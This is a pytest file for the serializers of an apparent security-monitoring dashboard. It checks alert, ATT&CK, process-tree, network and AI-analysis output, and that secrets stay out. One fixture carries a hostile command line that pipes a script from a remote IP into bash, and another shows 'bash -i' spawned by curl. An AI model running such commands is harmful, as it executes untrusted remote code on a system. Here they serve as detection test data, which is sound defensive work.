"""Tests for the dashboard's JSON contract (Phase 6).

The serializers are the only place model objects become dashboard data, so the
properties worth pinning down are: the shape is stable, nothing internal leaks,
raw log lines and secrets are left behind, and nothing is invented -- especially
not an ATT&CK mapping or a process ancestor.
"""

import json

import pytest

from conftest import make_alert, make_event, network_event, process_event, sudo_event
from sentinelforge.ai.analyst import AISocAnalyst, attach_analysis
from sentinelforge.ai.cache import MemoryAnalysisCache
from sentinelforge.ai.client import LLMClient, LLMConfig
from sentinelforge.ai.providers.mock import MockProvider
from sentinelforge.correlation.engine import CorrelationEngine
from sentinelforge.dashboard.serializers import (
    API_VERSION,
    incident_alerts,
    mitre_breakdown,
    serialize_ai_analysis,
    serialize_alert,
    serialize_attack_chain,
    serialize_event,
    serialize_incident_detail,
    serialize_incident_summary,
    serialize_mitre,
    serialize_network,
    serialize_process_tree,
    serialize_sensor_status,
    serialize_stats,
    serialize_timeline,
)
from sentinelforge.models.event import EventType, Severity
from sentinelforge.sensors.base import SensorStatus


def analyzed(incident):
    """Attach a mock-provider AI analysis to an incident."""
    analyst = AISocAnalyst(
        LLMClient(MockProvider(), LLMConfig(), sleep=lambda _: None),
        cache=MemoryAnalysisCache(),
    )
    return attach_analysis(incident, analyst.analyze(incident))


def is_json_safe(value) -> bool:
    """Whether a payload contains only plain JSON types (no Python objects)."""
    try:
        json.loads(json.dumps(value))
    except (TypeError, ValueError):
        return False
    return True


class TestEventSerialization:
    def test_core_fields(self):
        event = make_event(
            0,
            event_type=EventType.AUTHENTICATION_FAILURE,
            severity=Severity.MEDIUM,
            user="capslock",
            src_ip="192.168.1.50",
            message="Failed password",
        )
        data = serialize_event(event)
        assert data["event_type"] == "authentication_failure"
        assert data["severity"] == "medium"
        assert data["user"] == "capslock"
        assert data["src_ip"] == "192.168.1.50"
        assert data["message"] == "Failed password"
        assert is_json_safe(data)

    def test_raw_log_line_is_not_exposed(self):
        """``message`` is the evidence; ``raw`` is bulk the UI never needs."""
        event = make_event(0, message="Failed password", raw="RAW-LINE-SHOULD-NOT-LEAVE")
        data = serialize_event(event)
        assert "raw" not in data
        assert "RAW-LINE-SHOULD-NOT-LEAVE" not in json.dumps(data)

    def test_sensor_telemetry_is_surfaced(self):
        data = serialize_event(process_event(0))
        assert data["telemetry"]["pid"] == 4242
        assert data["telemetry"]["parent_process"] == "curl"
        assert data["telemetry"]["command_line"] == "bash -i"

    def test_network_telemetry_is_surfaced(self):
        data = serialize_event(network_event(0))
        assert data["telemetry"]["destination_ip"] == "198.51.100.9"
        assert data["telemetry"]["destination_port"] == 443
        assert data["telemetry"]["protocol"] == "tcp"

    def test_absent_telemetry_is_omitted_not_faked(self):
        assert serialize_event(make_event(0))["telemetry"] == {}

    def test_enormous_values_are_bounded(self):
        event = make_event(0, message="A" * 50000)
        assert len(serialize_event(event)["message"]) <= 2001


class TestAlertSerialization:
    def test_alert_fields_and_mitre(self):
        alert = make_alert("SSH_BRUTE_FORCE", 0, "ALT-000001")
        data = serialize_alert(alert, incident_id="INC-000001")
        assert data["alert_id"] == "ALT-000001"
        assert data["incident_id"] == "INC-000001"
        assert data["rule_id"] == "SSH_BRUTE_FORCE"
        assert data["mitre"]["technique_id"] == "T1110.001"
        assert data["mitre"]["tactic"] == "Credential Access"
        assert is_json_safe(data)

    def test_evidence_is_opt_in_and_bounded(self):
        events = [make_event(index) for index in range(30)]
        alert = make_alert("SSH_BRUTE_FORCE", 0, "ALT-000001", evidence=events)
        assert "evidence" not in serialize_alert(alert)
        detailed = serialize_alert(alert, include_evidence=True, max_evidence=5)
        assert len(detailed["evidence"]) == 5
        assert detailed["evidence_truncated"] is True

    def test_alert_without_mitre_mapping_reports_none(self):
        alert = make_alert("SSH_BRUTE_FORCE", 0, "ALT-000001")
        alert.mitre = None
        assert serialize_alert(alert)["mitre"] is None


class TestMitreSerialization:
    def test_sub_technique_is_preferred_with_its_parent_kept(self):
        item = serialize_mitre(
            {
                "technique_id": "T1110",
                "technique": "Brute Force",
                "sub_technique_id": "T1110.001",
                "sub_technique": "Password Guessing",
                "tactic": "Credential Access",
            }
        )
        assert item["technique_id"] == "T1110.001"
        assert item["technique"] == "Password Guessing"
        assert item["parent_technique_id"] == "T1110"
        assert item["tactic"] == "Credential Access"

    def test_missing_mapping_is_none_not_invented(self):
        assert serialize_mitre(None) is None
        assert serialize_mitre({}) is None
        assert serialize_mitre({"tactic": "Execution"}) is None

    def test_breakdown_counts_alerts_and_incidents(self, compromise_incident):
        items = mitre_breakdown([compromise_incident])
        assert items
        by_id = {item["technique_id"]: item for item in items}
        assert "T1110.001" in by_id
        assert by_id["T1110.001"]["alert_count"] >= 1
        assert by_id["T1110.001"]["incident_ids"] == ["INC-000001"]
        assert by_id["T1110.001"]["rule_ids"]

    def test_breakdown_only_contains_techniques_that_fired(self, compromise_incident):
        fired = {
            (alert.mitre or {}).get("sub_technique_id") or (alert.mitre or {}).get("technique_id")
            for alert in compromise_incident.alerts
        }
        for item in mitre_breakdown([compromise_incident]):
            assert item["technique_id"] in fired


class TestIncidentSerialization:
    def test_summary_shape(self, compromise_incident):
        data = serialize_incident_summary(compromise_incident)
        for field in (
            "incident_id", "title", "status", "severity", "risk_score", "first_seen",
            "last_seen", "host", "source_ips", "users", "alert_count", "rule_ids",
            "techniques", "version", "has_ai_analysis",
        ):
            assert field in data
        assert data["incident_id"] == "INC-000001"
        assert data["has_ai_analysis"] is False
        assert is_json_safe(data)

    def test_detail_includes_every_investigation_section(self, compromise_incident):
        data = serialize_incident_detail(compromise_incident)
        for section in ("attack_chain", "mitre", "alerts", "timeline", "process_tree", "network", "ai_analysis"):
            assert section in data
        assert is_json_safe(data)

    def test_timeline_entries_are_enriched_from_evidence(self, compromise_incident):
        timeline = serialize_timeline(compromise_incident)
        assert timeline["entries"]
        alert_entries = [entry for entry in timeline["entries"] if entry["type"] == "alert"]
        assert alert_entries
        assert alert_entries[0]["mitre"] is not None
        assert alert_entries[0]["rule_id"]
        event_entries = [entry for entry in timeline["entries"] if entry["type"] == "event"]
        assert any(entry["evidence"] for entry in event_entries)

    def test_timeline_limit_is_reported(self, compromise_incident):
        timeline = serialize_timeline(compromise_incident, limit=2)
        assert len(timeline["entries"]) == 2
        assert timeline["truncated"] is True
        assert timeline["total"] > 2

    def test_attack_chain_is_one_stage_per_alert(self, compromise_incident):
        chain = serialize_attack_chain(compromise_incident)
        assert len(chain["stages"]) == compromise_incident.alert_count
        assert chain["matched_chains"] == compromise_incident.matched_chains
        assert [stage["rule_id"] for stage in chain["stages"]] == [
            alert.rule_id for alert in compromise_incident.alerts
        ]

    def test_attack_chain_invents_no_stages(self):
        incident = CorrelationEngine().run([make_alert("SSH_BRUTE_FORCE", 0, "ALT-000001")])[0]
        assert len(serialize_attack_chain(incident)["stages"]) == 1


class TestProcessTree:
    def test_absent_telemetry_is_reported_not_faked(self, compromise_incident):
        tree = serialize_process_tree(compromise_incident)
        assert tree["available"] is False
        assert tree["roots"] == []
        assert "eBPF process sensor" in tree["reason"]

    def test_lineage_is_built_from_pid_and_ppid(self):
        parent = process_event(0, process="bash", parent="curl", pid=200, ppid=100)
        child = process_event(10, process="python3", parent="bash", pid=300, ppid=200)
        alerts = [
            make_alert("SUSPICIOUS_PROCESS_EXECUTION", 0, "ALT-000001", evidence=[parent, child])
        ]
        tree = serialize_process_tree(CorrelationEngine().run(alerts)[0])
        assert tree["available"] is True
        assert tree["process_count"] == 2
        root = tree["roots"][0]
        assert root["pid"] == 100  # curl: named by the child, never observed
        assert root["observed"] is False
        assert root["children"][0]["pid"] == 200
        assert root["children"][0]["children"][0]["pid"] == 300
        assert root["children"][0]["children"][0]["depth"] == 2

    def test_an_unobserved_parent_is_marked_and_the_tree_is_flagged_incomplete(self):
        alerts = [
            make_alert("SUSPICIOUS_PROCESS_EXECUTION", 0, "ALT-000001", evidence=[process_event(0)])
        ]
        tree = serialize_process_tree(CorrelationEngine().run(alerts)[0])
        assert tree["incomplete"] is True
        assert tree["inferred_parents"][0]["process"] == "curl"
        assert tree["roots"][0]["observed"] is False
        assert tree["process_count"] == 1  # only the observed process is counted

    def test_no_ancestor_is_invented_when_the_parent_is_unnamed(self):
        event = process_event(0)
        event.metadata.pop("parent_process")
        alerts = [make_alert("SUSPICIOUS_PROCESS_EXECUTION", 0, "ALT-000001", evidence=[event])]
        tree = serialize_process_tree(CorrelationEngine().run(alerts)[0])
        assert tree["roots"][0]["pid"] == 4242
        assert tree["roots"][0]["observed"] is True
        assert tree["incomplete"] is True
        assert tree["unknown_parents"]

    def test_command_lines_are_carried_as_data(self):
        event = process_event(0, command_line="bash -c 'curl http://198.51.100.9/x.sh | bash'")
        alerts = [make_alert("SUSPICIOUS_PROCESS_EXECUTION", 0, "ALT-000001", evidence=[event])]
        tree = serialize_process_tree(CorrelationEngine().run(alerts)[0])
        node = tree["roots"][0]["children"][0]
        assert node["command_line"].startswith("bash -c")
        assert is_json_safe(tree)


class TestNetworkSerialization:
    def test_absent_telemetry_is_reported(self, compromise_incident):
        network = serialize_network(compromise_incident)
        assert network["available"] is False
        assert "eBPF network sensor" in network["reason"]

    def test_connection_metadata(self):
        alerts = [
            make_alert("SUSPICIOUS_NETWORK_CONNECTION", 0, "ALT-000001", evidence=[network_event(0)])
        ]
        network = serialize_network(CorrelationEngine().run(alerts)[0])
        assert network["available"] is True
        connection = network["connections"][0]
        assert connection["destination_ip"] == "198.51.100.9"
        assert connection["destination_port"] == 443
        assert connection["protocol"] == "tcp"
        assert connection["process"] == "bash"
        assert connection["pid"] == 4242

    def test_no_payload_fields_exist(self):
        alerts = [
            make_alert("SUSPICIOUS_NETWORK_CONNECTION", 0, "ALT-000001", evidence=[network_event(0)])
        ]
        network = serialize_network(CorrelationEngine().run(alerts)[0])
        blob = json.dumps(network).lower()
        for forbidden in ("payload", "packet", "bytes_sent", "content"):
            assert forbidden not in blob


class TestAIAnalysisSerialization:
    def test_missing_analysis_is_a_normal_state(self, compromise_incident):
        data = serialize_ai_analysis(compromise_incident)
        assert data["available"] is False
        assert data["status"] is None
        assert "sentinelforge ai analyze" in data["reason"]
        # The deterministic result is still reported next to it.
        assert data["deterministic"]["severity"] == compromise_incident.severity
        assert data["deterministic"]["risk_score"] == compromise_incident.risk_score

    def test_analysis_is_shown_beside_the_deterministic_verdict(self, compromise_incident):
        incident = analyzed(compromise_incident)
        data = serialize_ai_analysis(incident)
        assert data["available"] is True
        assert data["assessment"]
        assert 0.0 <= data["confidence"] <= 1.0
        assert data["deterministic_severity"] == incident.severity
        assert data["deterministic_score"] == incident.risk_score
        assert data["severity_disagreement"] in (True, False)
        assert data["provenance"]["is_mock"] is True

    def test_ai_cannot_replace_the_deterministic_score(self, compromise_incident):
        incident = analyzed(compromise_incident)
        incident.ai_analysis["severity_assessment"] = "low"
        incident.ai_analysis["deterministic_score"] = 1
        data = serialize_ai_analysis(incident)
        # The incident's own values are reported untouched in `deterministic`.
        assert data["deterministic"]["risk_score"] == incident.risk_score
        assert data["deterministic"]["severity"] == incident.severity

    def test_failed_analysis_is_reported_as_failed(self, compromise_incident):
        compromise_incident.ai_analysis = {
            "status": "failed", "assessment": "unavailable", "confidence": 0.0,
            "summary": "", "error": "provider timed out", "audit": {"provider": "openai"},
        }
        data = serialize_ai_analysis(compromise_incident)
        assert data["available"] is False
        assert data["status"] == "failed"
        assert "timed out" in data["reason"]

    def test_no_api_key_or_prompt_is_exposed(self, compromise_incident):
        blob = json.dumps(serialize_ai_analysis(analyzed(compromise_incident)))
        assert "api_key" not in blob
        assert "OPENAI" not in blob
        assert "system_prompt" not in blob


class TestSensorAndStats:
    def test_sensor_status(self):
        status = SensorStatus(name="ebpf-process", available=False, reason="needs root", remedy="use sudo")
        data = serialize_sensor_status(status, "process tracing")
        assert data == {
            "name": "ebpf-process",
            "available": False,
            "state": "offline",
            "description": "process tracing",
            "reason": "needs root",
            "remedy": "use sudo",
        }

    def test_stats_shape(self):
        data = serialize_stats(
            {"critical": 2, "high": 1},
            {"open": 2, "resolved": 1},
            {"events_received": 10},
            incident_total=3,
        )
        assert data["incidents"]["critical"] == 2
        assert data["incidents"]["active"] == 2
        assert data["incidents"]["total"] == 3
        assert data["incidents"]["by_severity"]["medium"] == 0
        assert data["api_version"] == API_VERSION
        assert is_json_safe(data)


class TestNoInternalObjectsLeak:
    def test_every_payload_is_plain_json(self, compromise_incident):
        incident = analyzed(compromise_incident)
        for payload in (
            serialize_incident_detail(incident),
            serialize_timeline(incident),
            serialize_attack_chain(incident),
            serialize_process_tree(incident),
            serialize_network(incident),
            serialize_ai_analysis(incident),
            incident_alerts(incident, include_evidence=True),
            mitre_breakdown([incident]),
        ):
            assert is_json_safe(payload)
